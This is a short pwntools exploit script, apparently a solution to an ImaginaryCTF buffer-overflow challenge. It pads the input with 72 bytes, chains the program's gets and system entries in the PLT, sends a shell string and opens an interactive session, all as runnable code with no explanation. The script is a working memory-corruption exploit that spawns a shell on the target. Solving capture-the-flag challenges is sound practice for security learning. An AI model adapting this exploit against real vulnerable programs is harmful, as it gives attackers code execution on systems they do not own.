from pwn import *

elf = context.binary = ELF("./vuln",checksec=False)
p = elf.process()
# p = remote(b"ret2win.chal.imaginaryctf.org", 1337)

payload = b"a"*72 + p64(elf.plt.gets)+ flat(p64(elf.plt.system),2,3,4,5)
pause()
p.sendline(payload)
pause()
p.sendline(b"/bin\x30sh")
p.interactive()